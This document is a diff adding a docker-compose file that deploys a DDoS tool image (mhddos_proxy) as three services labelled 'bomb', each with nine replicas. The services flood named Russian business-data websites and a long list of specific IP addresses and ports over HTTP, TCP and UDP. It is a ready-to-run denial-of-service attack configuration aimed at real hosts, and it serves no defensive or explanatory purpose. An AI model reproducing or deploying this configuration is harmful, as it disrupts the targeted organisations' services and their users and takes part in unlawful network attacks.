@@ -1,0 +1,22 @@
+version: '3'
+
+services:
+
+  bomb01:
+    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
+    command:  https://credinform.ru  https://company.myseldon.com/  https://globalstat.ru/  http://egrul-base.ru/  https://datalegal.ru/ -t 1000 -p 1200 --rpc 100 --http-methods bypass --debug
+    deploy:
+      replicas: 9
+
+  bomb02:
+    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
+    command: tcp://188.124.43.50:21  tcp://188.124.43.50:25  tcp://188.124.43.50:80  tcp://188.124.43.50:81  tcp://188.124.43.50:443  tcp://185.179.199.49:80  tcp://185.179.199.49:443  tcp://185.179.199.48:80  tcp://185.179.199.48:443  tcp://185.179.199.85:80  tcp://185.179.199.85:443  tcp://185.179.199.71:8082  tcp://185.179.199.71:443  tcp://138.201.59.236:80  tcp://138.201.59.236:443  tcp://185.179.199.84:80  tcp://185.179.199.84:443  tcp://94.130.114.52:25  tcp://94.130.114.52:80  tcp://94.130.114.52:110  tcp://94.130.114.52:135  tcp://94.130.114.52:143  tcp://94.130.114.52:443  tcp://94.130.114.52:444  tcp://94.130.114.52:465  tcp://94.130.114.52:993  tcp://94.130.114.52:995  tcp://94.130.114.52:3389  tcp://94.130.114.52:5985  tcp://89.253.237.218:22  tcp://89.253.237.218:80  tcp://89.253.237.218:443  tcp://77.221.130.32:22  tcp://77.221.130.32:80  tcp://77.221.130.32:81  tcp://77.221.130.32:199  tcp://77.221.130.32:443  tcp://185.178.46.130:22  tcp://185.178.46.130:80  tcp://185.178.46.130:443  tcp://92.53.96.181:22  tcp://92.53.96.181:80  tcp://92.53.96.181:443 -t 1000 -p 300 --rpc 100 --http-methods TCP --debug
+    deploy:
+      replicas: 9
+
+  bomb03:
+    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
+    command:   77.221.130.32:161 -t 1500 -p 1200 --rpc 100 --http-methods UDP --debug
+    deploy:
+      replicas: 9
+
